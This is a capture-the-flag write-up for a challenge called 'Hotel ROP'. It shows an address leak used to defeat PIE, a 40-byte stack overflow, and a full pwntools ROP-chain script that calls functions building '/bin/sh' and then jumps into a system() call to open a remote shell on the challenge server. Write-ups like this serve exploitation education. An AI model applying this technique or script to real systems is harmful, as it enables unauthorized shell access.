# Hotel ROP

In this challenge we are given a binary, `hotel_rop` and a link to a server running this binary.

Running the file, we get the following output:
```
$ ./hotel_rop
Welcome to Hotel ROP, on main street 0x5617508ca36d
You come here often?
a
I think you should come here more often.
```

Running this multiple times, the number after "main street" keeps changing every time, but always ends with `36d`.
As it always starts with `0x55` or `0x56`, I can assume that this is an address in the program itself and not the stack or heap or libc.

Opening `hotel_rop` in Radare2 and seeking to `main`, I find immediately that `main` is at an offset of `0x136d`, so this address should be our `main` in the current program.

Checking the security of the binary, I saw that it is a PIE, but without a stack canary. Thus, it's a candidate for buffer overflows and ROP.

To find the offset for overflowing the buffer I just kept running `perl -e 'print "\x41"x40;'` with different multipliers until I got a segmentation fault. The correct offset is 40 bytes.

Looking at `california` (offset `0x11dc`) and `silicon_valley` (offset `0x1283`) in Radare2, I notice that they write something to various offsets of some memory address called `win_land`. Looking more closely, `california` writes `/bin` to `win_land`, and `silicon_valley` writes `/sh`. As there is also a counter called `len` used for offsets, calling `california` then `silicon_valley` writes `/bin/sh` to `win_land`.

Well, that was easy.

Looking at the disassembly of the function `loss` in Radare2, I see that towards the end it runs `system(win_land)` if you pass a few complicated tests on the arguments to the function. However, since we can jump straight to this address (at offset `0x11c3`), we can call this directly without the need to provide arguments to `loss`.

So, the plan is: get the base address of `main` from the first line, calculate the offsets of `california`, `silicon_valley` and `loss`, and use this address to make a rop chain running those in order. Here is the code:

```python
from pwn import *

p = remote('dctf1-chall-hotel-rop.westeurope.azurecontainer.io', 7480)

main_offset = 0x136d
california_offset = 0x11dc
silicon_valley_offset = 0x1283
system_offset = 0x11c3

p.recvuntil("street")
base = int(p.recvline().strip(), 16) - main_offset

california = p64(base + california_offset)
silicon_valley = p64(base + silicon_valley_offset)
system = p64(base + system_offset)

p.recvuntil("often?\n")
p.sendline((b'\x00'*40) + california + silicon_valley + system)
p.interactive()
```

This pops a shell, and the flag is at `flag.txt`.
